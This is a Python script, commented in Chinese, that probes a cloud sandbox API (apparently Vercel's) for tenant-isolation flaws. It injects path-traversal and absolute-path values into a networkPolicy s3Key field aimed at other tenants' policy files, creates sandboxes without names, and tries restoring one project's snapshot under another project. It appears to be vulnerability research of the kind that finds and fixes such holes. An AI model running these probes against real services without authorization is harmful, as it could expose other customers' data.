# -*- coding: utf-8 -*-
"""非传统面H: ①networkPolicy.s3Key 用户可控 → 服务端 S3 读取面 ②v4 无 name 创建 ③跨项目快照恢复/resume"""
import json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TOKEN, TEAM, PROJ, BASE

def log(s): print(s, flush=True)

api("DELETE", "/v2/sandboxes/n26?teamId=%s&projectId=%s" % (TEAM, PROJ))
time.sleep(2)

# ① s3Key 注入
log('===== ① s3Key =====')
for tag, pol in [
    ('s3key-own', {"mode": "allow-all", "s3Key": "policy/my-custom-key.json"}),
    ('s3key-traversal', {"mode": "allow-all", "s3Key": "../../../other-tenant/policy.json"}),
    ('s3key-abs', {"mode": "allow-all", "s3Key": "/secret/real-policy.json"}),
]:
    c, r = api("POST", "/v4/sandboxes?teamId=%s" % TEAM,
               {"projectId": PROJ, "name": "n26", "networkPolicy": pol}, 60)
    log('[create %s] -> %s | %s' % (tag, c, (r or '')[:350].replace(chr(10), ' ')))
    if c == 200:
        # GET 看回显
        c2, r2 = api("GET", "/v2/sandboxes/n26?teamId=%s&projectId=%s" % (TEAM, PROJ), None, 20)
        np = ''
        try:
            np = json.dumps(json.loads(r2)['sandbox'].get('networkPolicy'))
        except Exception: pass
        log('  GET n26 -> %s | np=%s' % (c2, np[:250]))
        # PATCH 换 s3Key
        c3, r3 = api("PATCH", "/v2/sandboxes/n26?teamId=%s&projectId=%s" % (TEAM, PROJ),
                     {"networkPolicy": {"mode": "allow-all", "s3Key": "patched-key.json"}}, 20)
        log('  PATCH s3key -> %s | %s' % (c3, (r3 or '')[:200].replace(chr(10), ' ')))
        # 行为验证: guest 出站是否受影响
        c4, r4 = api("POST", "/v2/sandboxes/sessions/%s/cmd?teamId=%s" % (
            json.loads(r)['sandbox']['currentSessionId'], TEAM),
            {"command": "sh", "args": ["-c", "curl -s -m 5 -o /dev/null -w '%{http_code}' https://httpbin.org/anything || echo X"],
             "wait": True, "timeout": 12000, "logs": True}, 30)
        log('  egress test -> %s | %s' % (c4, (r4 or '')[:200].replace(chr(10), ' ')))
        api("DELETE", "/v2/sandboxes/n26?teamId=%s&projectId=%s" % (TEAM, PROJ))
        time.sleep(2)

# ② 无 name 创建
log('')
log('===== ② 无 name =====')
c, r = api("POST", "/v4/sandboxes?teamId=%s" % TEAM, {"projectId": PROJ}, 60)
log('no-name create -> %s | %s' % (c, (r or '')[:300].replace(chr(10), ' ')))
if c == 200:
    nm = json.loads(r)['sandbox']['name']
    log('auto name: %s' % nm)
    c2, r2 = api("GET", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (nm, TEAM, PROJ), None, 20)
    log('GET by auto-name -> %s' % c2)
    api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (nm, TEAM, PROJ))

# ③ 跨项目快照
log('')
log('===== ③ 跨项目快照 =====')
c, r = api("POST", "/v9/projects?teamId=%s" % TEAM, {"name": "sec-lab-3"}, 40)
proj3 = None
if c in (200, 201):
    try: proj3 = json.loads(r).get('project', {}).get('id')
    except Exception: pass
log('proj3=%s' % proj3)
# proj1 建沙箱+快照
c, r = api("POST", "/v4/sandboxes?teamId=%s" % TEAM, {"projectId": PROJ, "name": "n26s"}, 60)
sid = json.loads(r)['sandbox']['currentSessionId']
time.sleep(3)
api("POST", "/v2/sandboxes/sessions/%s/stop?teamId=%s" % (sid, TEAM), {}, 25)
time.sleep(3)
c, r = api("GET", "/v2/sandboxes/n26s?teamId=%s&projectId=%s" % (TEAM, PROJ), None, 20)
snap = None
try: snap = json.loads(r)['sandbox'].get('currentSnapshotId')
except Exception: pass
log('proj1 snap=%s' % snap)
if proj3 and snap:
    # 用 proj3 的 projectId 恢复 proj1 的快照
    c, r = api("POST", "/v4/sandboxes?teamId=%s" % TEAM,
               {"projectId": proj3, "name": "xsnap", "source": {"type": "snapshot", "snapshotId": snap}}, 90)
    log('restore proj1 snap via proj3 -> %s | %s' % (c, (r or '')[:250].replace(chr(10), ' ')))
    if c == 200:
        api("DELETE", "/v2/sandboxes/xsnap?teamId=%s&projectId=%s" % (proj3 and TEAM, proj3))
api("DELETE", "/v2/sandboxes/n26s?teamId=%s&projectId=%s" % (TEAM, PROJ))
if proj3:
    api("DELETE", "/v9/projects/%s?teamId=%s" % (proj3, TEAM), None, 30)
log('DONE')
